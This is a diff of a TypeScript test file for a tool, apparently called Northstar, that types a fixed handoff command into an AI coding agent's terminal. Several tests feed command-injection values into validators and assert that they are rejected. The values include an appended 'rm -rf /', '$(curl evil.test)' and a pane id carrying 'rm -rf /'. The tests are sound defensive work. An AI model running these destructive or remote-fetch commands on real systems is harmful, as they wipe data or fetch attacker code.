@@ -1,8 +1,8 @@
 import assert from "node:assert/strict";
 import { afterEach, test } from "node:test";
-import { findControllingTty } from "../src/terminal/discover.js";
-import { TerminalHandoff, awaitingAnswer, typedInput } from "../src/terminal/inject.js";
-import { type AgentKind, CLAUDE_CODE_LINE, HANDOFF_LINE } from "../src/terminal/payload.js";
+import { classifyCommand, findControllingTty } from "../src/terminal/discover.js";
+import { TerminalTyper, awaitingAnswer, typedInput } from "../src/terminal/inject.js";
+import { HANDOFF_COMMAND, assertHandoffCommand } from "../src/terminal/payload.js";
 import type { DriverName, TerminalDriver } from "../src/terminal/types.js";
 
 class FakeDriver implements TerminalDriver {
@@ -27,18 +27,10 @@ class FakeDriver implements TerminalDriver {
   }
 }
 
-function handoffWith(
-  driver: TerminalDriver | null,
-  reason?: string,
-  agent: AgentKind = "other",
-): TerminalHandoff {
-  const handoff = new TerminalHandoff(
-    () => {},
-    1200,
-    async () => agent,
-  );
-  Object.assign(handoff, { detection: { driver, reason } });
-  return handoff;
+function typerWith(driver: TerminalDriver | null, reason?: string, fix?: string): TerminalTyper {
+  const typer = new TerminalTyper(() => {}, 1200);
+  Object.assign(typer, { detection: { driver, reason, fix } });
+  return typer;
 }
 
 const IDLE = "> \n";
@@ -56,104 +48,100 @@ test("findControllingTty walks past the detached server to the agent's terminal"
   assert.ok(tty === null || /^\/dev\/\w+/.test(tty), `unexpected tty ${tty}`);
 });
 
-test("a settled screen gets the line and a separate Enter", async () => {
+test("a settled screen gets the fixed line and a separate Enter", async () => {
   const driver = new FakeDriver([IDLE]);
-  const result = await handoffWith(driver).send();
-  assert.equal(result.typed, true);
-  assert.equal(result.driver, "tmux");
-  assert.deepEqual(driver.writes, [HANDOFF_LINE]);
+  const result = await typerWith(driver).type();
+  assert.deepEqual(result, { typed: true });
+  assert.deepEqual(driver.writes, [HANDOFF_COMMAND]);
   assert.equal(driver.enters, 1);
 });
 
-test("a Claude Code agent gets the resolve-comments slash command", async () => {
-  const driver = new FakeDriver([IDLE]);
-  const result = await handoffWith(driver, undefined, "claude-code").send();
-  assert.equal(result.typed, true);
-  assert.deepEqual(driver.writes, [CLAUDE_CODE_LINE]);
-  assert.equal(CLAUDE_CODE_LINE, "/mcp__northstar__resolve-comments");
+test("only the fixed handoff line can be typed", () => {
+  assert.ok(!/\n|\r/.test(HANDOFF_COMMAND));
+  assert.ok(HANDOFF_COMMAND.includes("list_comments"));
+  assert.doesNotThrow(() => assertHandoffCommand(HANDOFF_COMMAND));
+  assert.throws(() => assertHandoffCommand(`${HANDOFF_COMMAND}; rm -rf /`), /fixed Northstar/);
+  assert.throws(() => assertHandoffCommand("$(curl evil.test)"), /fixed Northstar/);
 });
 
-test("the typed line carries no caller-controlled text", () => {
-  assert.ok(!/\n|\r/.test(HANDOFF_LINE));
-  assert.ok(HANDOFF_LINE.includes("list_comments"));
-  assert.ok(HANDOFF_LINE.includes("get_comment"));
-  assert.ok(HANDOFF_LINE.includes("resolve_comment"));
+test("agents are told apart by their command line", () => {
+  assert.equal(
+    classifyCommand("claude --dangerously-load-development-channels server:northstar"),
+    "claude-code",
+  );
+  assert.equal(classifyCommand("node /opt/homebrew/bin/codex exec"), "codex");
+  assert.equal(
+    classifyCommand("node /usr/lib/node_modules/@google/gemini-cli/dist/index.js"),
+    "gemini",
+  );
+  assert.equal(classifyCommand("/bin/zsh -c eval 'claude --print'"), "other");
+  assert.equal(classifyCommand("vim claude.md"), "other");
 });
 
 test("a pending choice prompt is never answered", async () => {
   const driver = new FakeDriver([PERMISSION_PROMPT]);
-  const result = await handoffWith(driver).send();
+  const result = await typerWith(driver).type();
   assert.equal(result.typed, false);
-  assert.match(result.reason ?? "", /waiting on a prompt/);
+  assert.equal(result.typed === false && /waiting on a prompt/.test(result.reason), true);
   assert.equal(driver.writes.length, 0);
   assert.equal(driver.enters, 0);
 });
 
 test("a yes/no confirmation is never answered", async () => {
   const driver = new FakeDriver(["Overwrite the file? (y/n)"]);
-  const result = await handoffWith(driver).send();
+  const result = await typerWith(driver).type();
   assert.equal(result.typed, false);
   assert.equal(driver.enters, 0);
 });
 
 test("output still moving is waited out, then typed", async () => {
   const driver = new FakeDriver(["building...", "building... done", IDLE]);
-  const result = await handoffWith(driver).send();
+  const result = await typerWith(driver).type();
   assert.equal(result.typed, true);
-  assert.deepEqual(driver.writes, [HANDOFF_LINE]);
+  assert.deepEqual(driver.writes, [HANDOFF_COMMAND]);
 });
 
 test("a driver that cannot be read fails closed", async () => {
   const driver = new FakeDriver([IDLE]);
   driver.captureError = new Error("osascript denied");
-  const result = await handoffWith(driver).send();
+  const result = await typerWith(driver).type();
   assert.equal(result.typed, false);
-  assert.match(result.reason ?? "", /osascript denied/);
+  assert.equal(result.typed === false && /osascript denied/.test(result.reason), true);
   assert.equal(driver.writes.length, 0);
 });
 
-test("no detected terminal reports the reason instead of throwing", async () => {
-  const result = await handoffWith(null, "no supported terminal detected").send();
-  assert.equal(result.typed, false);
-  assert.equal(result.reason, "no supported terminal detected");
+test("no detected terminal reports the reason and the fix instead of throwing", async () => {
+  const result = await typerWith(null, "no terminal", "use tmux").type();
+  assert.deepEqual(result, { typed: false, reason: "no terminal", fix: "use tmux" });
 });
 
-test("describe reports availability for the toolbar", async () => {
-  assert.deepEqual(await handoffWith(new FakeDriver([IDLE])).describe(), {
-    available: true,
-    driver: "tmux",
-  });
-  assert.deepEqual(await handoffWith(null, "nope").describe(), {
-    available: false,
-    reason: "nope",
-  });
+test("check reports a readable session and a broken one", async () => {
+  assert.deepEqual(await typerWith(new FakeDriver([IDLE])).check(), { ok: true, driver: "tmux" });
+  const broken = new FakeDriver([IDLE]);
+  broken.captureError = new Error("no pane");
+  const check = await typerWith(broken).check();
+  assert.equal(check.ok, false);
+  assert.equal(!check.ok && /no pane/.test(check.reason), true);
+  const none = await typerWith(null, "nope", "fix it").check();
+  assert.deepEqual(none, { ok: false, reason: "nope", fix: "fix it" });
 });
 
-test("back-to-back sends are coalesced into one typed line", async () => {
+test("every send types at most once and never retries", async () => {
   const driver = new FakeDriver([IDLE]);
-  const handoff = handoffWith(driver);
-  const [a, b] = await Promise.all([handoff.send(), handoff.send()]);
-  assert.equal(a.typed, true);
-  assert.equal(b.typed, false);
-  assert.match(b.reason ?? "", /folded into the batch/);
-  assert.equal(driver.writes.length, 1, "the second batch rides the first announcement");
-  assert.equal(driver.enters, 1);
-});
-
-test("a flood on loopback cannot type at the agent repeatedly", async () => {
-  const driver = new FakeDriver([IDLE]);
-  const handoff = handoffWith(driver);
-  for (let i = 0; i < 20; i += 1) await handoff.send();
-  assert.equal(driver.writes.length, 1);
+  const typer = typerWith(driver);
+  await typer.type();
+  await typer.type();
+  assert.equal(driver.writes.length, 2);
+  assert.equal(driver.enters, 2);
 });
 
 const lines = (screen: string) => screen.split("\n").filter(Boolean);
 
 test("text already in the agent input is never typed over", async () => {
   const driver = new FakeDriver(["> fix the hero spac\n"]);
-  const result = await handoffWith(driver).send();
+  const result = await typerWith(driver).type();
   assert.equal(result.typed, false);
-  assert.match(result.reason ?? "", /text in the agent input/);
+  assert.equal(result.typed === false && /text in the agent input/.test(result.reason), true);
   assert.equal(driver.writes.length, 0);
   assert.equal(driver.enters, 0);
 });
@@ -173,27 +161,21 @@ test("only the last line decides a confirm prompt and a stale choice list is ign
   assert.equal(awaitingAnswer(lines("  1. just a numbered list\n  2. in the output")), false);
 });
 
-test("an agent that cannot be identified reports the reason and types nothing", async () => {
-  const driver = new FakeDriver([IDLE]);
-  const handoff = new TerminalHandoff(
-    () => {},
-    1200,
-    async () => {
-      throw new Error("ps unavailable");
-    },
-  );
-  Object.assign(handoff, { detection: { driver } });
-  const result = await handoff.send();
-  assert.equal(result.typed, false);
-  assert.match(result.reason ?? "", /ps unavailable/);
-  assert.equal(driver.writes.length, 0);
-});
-
-test("a transient detection failure is not cached", async () => {
-  const handoff = new TerminalHandoff(() => {}, 1200);
+test("a definitive detection answer is cached", async () => {
+  const typer = new TerminalTyper(() => {}, 1200);
   process.env.NORTHSTAR_TERMINAL = "none";
-  assert.equal((await handoff.describe()).available, false);
+  assert.equal((await typer.check()).ok, false);
   process.env.NORTHSTAR_TERMINAL = "tmux";
   process.env.TMUX_PANE = "%1";
-  assert.equal((await handoff.describe()).available, false, "a definitive answer is cached");
+  const check = await typer.check();
+  assert.equal(check.ok, false);
+  assert.equal(!check.ok && /NORTHSTAR_TERMINAL=none/.test(check.reason), true);
+});
+
+test("a malformed pane id never reaches a command", async () => {
+  process.env.NORTHSTAR_TERMINAL = "tmux";
+  process.env.TMUX_PANE = "%1; rm -rf /";
+  const check = await new TerminalTyper(() => {}, 1200).check();
+  assert.equal(check.ok, false);
+  assert.equal(!check.ok && /not a pane id/.test(check.reason), true);
 });
